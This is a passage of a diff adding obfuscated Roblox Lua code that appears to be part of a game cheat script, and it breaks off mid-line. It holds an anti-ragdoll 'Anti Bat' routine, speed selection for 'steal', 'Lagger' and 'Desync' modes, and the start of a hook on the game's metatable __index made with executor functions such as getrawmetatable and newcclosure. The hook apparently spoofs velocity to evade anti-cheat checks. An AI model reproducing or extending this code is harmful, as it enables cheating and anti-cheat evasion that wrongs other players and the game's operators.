+                        ki.RagdollConnection = c.Heartbeat:Connect(function() if not E["Anti Bat"] then return; end; local ki = m.Character; if not ki then return; end; local zi, Si = ki:FindFirstChildOfClass("Humanoid"), ki:FindFirstChild("HumanoidRootPart"); if zi then local gi = zi:GetState(); if gi == Enum.HumanoidStateType.Physics or gi == Enum.HumanoidStateType.Ragdoll or gi == Enum.HumanoidStateType.FallingDown then zi:ChangeState(Enum.HumanoidStateType.Running); workspace.CurrentCamera.CameraSubject = zi; pcall(function() local zi = m.PlayerScripts:FindFirstChild("PlayerModule"); if zi then require(zi:FindFirstChild("ControlModule")):Enable(); end; end); if Si then Si.Velocity = Vector3.new(0, 0, 0); Si.RotVelocity = Vector3.new(0, 0, 0); end; end; end; for zi, zi in ipairs(ki:GetDescendants()) do if zi:IsA("Motor6D") and not zi.Enabled then zi.Enabled = true; end; end; end);
+                    end;
+                    local function ki()
+                        xi();
+                        _i ();
+                        Li();
+                    end;
+                    _G.__BubbleTrackStopper (xi);
+                    W["Anti Bat"] = function(_i)
+                        if _i then
+                            ki();
+                        else
+                            xi();
+                        end;
+                    end;
+                    _G.__BubbleTrackConn (m.CharacterAdded:Connect(function() task.wait(0.3); if E["Anti Bat"] then ki(); end; end));
+                    if E["Anti Bat"] then
+                        ki();
+                    end;
+                end;
+                local function ki()
+                    if _ == "Off" then return N.NormalSteal or S; end;
+                    if _ == "LaggerNormal" then return N.LaggerBoost or g; end;
+                    if _ == "LaggerCarry" or _ == "Lagger" or J then
+                        return N.LaggerSteal or S;
+                    elseif _ == "Desync" then
+                        return N.DesyncSteal or S;
+                    end;
+                    for J, J in ipairs(I) do
+                        if _ == J.name then
+                            return J.steal;
+                        end;
+                    end;
+                    return N.NormalSteal or S;
+                end;
+                local function J(xi)
+                    return O or xi and E["Auto Carry Speed"];
+                end;
+                do
+                    ii = _G.__BubbleSpeedSpoofState;
+                    if type(ii) == "table" then
+                        ii.enabled = false;
+                    end;
+                    local xi = _G.__BubbleS2SpeedState;
+                    if type(xi) ~= "table" then
+                        xi = {hooked = false};
+                        _G.__BubbleS2SpeedState = xi;
+                    end;
+                    xi.enabled = false;
+                    xi.root = nil;
+                    xi.velChecked = setmetatable({}, {__mode = "k"});
+                    local function _i (Li)
+                        xi.velChecked = setmetatable({}, {__mode = "k"});
+                        if not Li then
+                            xi.root = nil;
+                            return nil;
+                        end;
+                        local zi = Li:WaitForChild("HumanoidRootPart", 5);
+                        if zi then
+                            xi.root = zi;
+                            xi.velChecked[zi] = true;
+                        end;
+                        return zi;
+                    end;
+                    local function Li(zi)
+                        if not zi then
+                            return;
+                        end;
+                        xi.root = zi;
+                        xi.velChecked[zi] = true;
+                        if xi.hooked then
+                            return;
+                        end;
+                        if type(getrawmetatable) ~= "function" or type(setreadonly) ~= "function" or type(newcclosure) ~= "function" or type(checkcaller) ~= "function" then
+                            return;
+                        end;
+                        pcall(function() local zi = getrawmetatable(game); if not zi then return; end; local Si = rawget(zi, "__index"); if type(Si) ~= "function" and type(Si) ~= "table" then return; end; local gi = newcclosure(function(Oi, ni) local Ji = if type(Si) == "function" then(Si(Oi
